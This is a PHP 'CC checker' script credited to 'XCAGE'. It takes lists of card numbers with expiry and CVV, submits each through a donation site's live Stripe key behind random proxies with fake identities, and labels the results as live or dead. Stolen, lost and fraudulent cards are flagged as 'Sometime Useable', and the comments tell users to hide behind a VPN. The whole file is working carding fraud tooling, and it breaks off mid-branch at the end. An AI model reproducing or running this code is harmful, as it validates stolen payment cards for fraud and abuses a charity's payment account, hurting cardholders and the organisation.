<?php


/// Link of the sit:[https://victorykc.org/donate/]/////
/// Made by XCAGE
/// All the things are done.. :)
/// Now just use VPN and Enjoy :)
/// For PC and Phone HMA is recommended


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function zeltraxproxy()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = zeltraxproxy();
$ip = multiexplode(array(":", "|", ""), $poxySocks4)[0];
echo '<span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span>';
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
/////////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');

 if(strpos($fim, '"type":"credit"') !== false) {
  $bin = 'Credito';
} else {
  $bin = 'Debito';
}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////

//---------------------------------------------------------------------------------------------------------------------------------------------//

////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Accept-Language: en-US',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/m/v3/index-933c5ec6e698f8e8c478639778699b64.html?distinct_id=12ba6009-d438-44ec-9a32-56798be442ac'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//=============================================================================================================================================//
//=============================================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.jiosaavn.com%2Fpro%2F%3F_marker%3D0%26sourceID%3Dhomepage%23&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&card[cvc]='.$cvv.'&card[name]='.$email.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]=07&card[address_zip]='.$zip.'&card[address_country]='.$country.'&time_on_page=55626&guid=1221bc3c-6e15-4a3d-9bc6-7f5612465961&muid=58088e37-8587-4e6f-b478-09a5e305565f&sid=bf539bd2-0019-4a4c-98a0-65ddd335c734&key=pk_live_anVhGExMDwyZJNqTwJ2W1BS8');
//=============================================================================================================================================//
//=============================================================================================================================================//
$result = curl_exec($ch);
$monsage = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response Start]///////////////////////////////////////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, '"cvc_check": "pass"')){
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVC MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVC MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVC MATCHED - Incorrect Zip ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED - Incorrect Zip ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"The zip code you supplied failed validation.")){
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED - Zip failed validation ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Success" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ Fraudulent Card - Sometime Useable ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">♛</span> <span class="badge badge-info">  『 ★ Insufficient Funds - Sometime Useable ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">♛</span> <span class="badge badge-info">  『 ★ Insufficient Funds - Sometime Useable ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">♛</span> <span class="badge badge-info">  『 ★ Lost Card - Sometime Useable ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-info">  『 ★ CCN LIVE | Stolen Card - Sometime Useable ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-info">  『 ★ CCN LIVE ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-info">  『 ★ CCN LIVE | CVC Invalid ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-info">  『 ★ CCN LIVE ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-info">  『 ★ CCN LIVE | Pickup Card (Reported Stolen Or Lost) ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Your card has expired.')) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Card Expired ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "expired_card" )) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Expired Card ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Incorrect Card Number ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "incorrect_number")) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Incorrect Card Number ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "service_not_allowed")) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Service Not Allowed ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "do_not_honor")) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ do_not_honor ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "generic_decline")) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Declined : Generic_Decline ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Your card was declined.')) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Card Declined ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ CVC_Check : Unavailable ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'"cvc_check": "unchecked"')){
    echo '</br><span class="new badge badge-red">Reprovadas ❌ </span></br> <span class="new badge red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Security Code Check : Unchecked ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'"cvc_check": "fail"')){
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Security Code Check : Fail ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"parameter_invalid_empty")){
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Declined : Missing Card Details ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"lock_timeout")){
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Another Request In Process : Card Not Checked ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Card Doesnt Support This Purchase ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"transaction_not_allowed")){
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Card Doesnt Support Purchase ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"three_d_secure_redirect")){
